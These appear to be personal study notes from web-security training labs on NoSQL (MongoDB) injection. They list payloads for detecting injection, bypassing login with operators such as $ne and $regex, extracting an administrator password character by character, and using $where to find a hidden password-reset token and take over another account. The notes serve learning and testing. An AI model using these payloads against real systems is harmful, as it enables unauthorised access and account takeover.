Identify payloads:
```
'+'
' && 0 && 'x
' && 1 && 'x
'||1||'
```
Payloads to bypass auth
```
in DATA
username[$ne]=toto&password[$ne]=toto
login[$regex]=a.*&pass[$ne]=lol
login[$gt]=admin&login[$lt]=test&pass[$ne]=1
login[$nin][]=admin&login[$nin][]=test&pass[$ne]=toto

in JSON
{"username": {"$ne": null}, "password": {"$ne": null}}
{"username": {"$ne": "foo"}, "password": {"$ne": "bar"}}
{"username": {"$gt": undefined}, "password": {"$gt": undefined}}
{"username": {"$gt":""}, "password": {"$gt":""}}
```
![[Pasted image 20240209233504.png]]
If administrator blocked:
```
{"username": {"$regex":"admin.*"}, "password": {"$ne": null}}
```

Extact data process:
```
wiener' && '1'=='1 -> you get info about wiener
wiener' && '1'=='2 -> could not find user

this means you control the conditional
administrator' && this.password.length < 30 || 'a'=='b
administrator' && this.password.length < 9 || 'a'=='b
Notice that when you submit the value `9`, you retrieve the account details for the `administrator` user, but when you submit the value `8`, you receive an error message because the condition is false

Send to intruder payload:
administrator' && this.password[§0§]=='§a§
cluster bomb 0-7 numbers and a-z wordlist

administrator:qsqdmknp
```

Extract unkown info
```
{"username":"carlos","password":{"$ne":"invalid"}, "$where": "0"}
Invalid username or password

{"username":"carlos","password":{"$ne":"invalid"}, "$where": "1"}
Account locked

In the intruder clusterbomb 0-20 + a-z,A-Z,0-9
"$where":"Object.keys(this)[1].match('^.{§§}§§.*')"
grep in the response for 'account locked'
-> Username
"$where":"Object.keys(this)[4].match('^.{§§}§§.*')"
-> Password reset token = changePwd

GET /forgot-password?foo=invalid
same
GET /forgot-password?changePwd=invalid
Invalid token

Intruder again
"$where":"this.changePwd.match('^.{§§}§§.*')"
{"username":"carlos","password":{"$ne":"invalid"}, "$where": "this.changepwd.match('^.{§0§}§a§.*')"}
-> f3acfc29933ca9af
Go to /forgot-password?changePwd=f3acfc29933ca9af
and change carlos pass

```

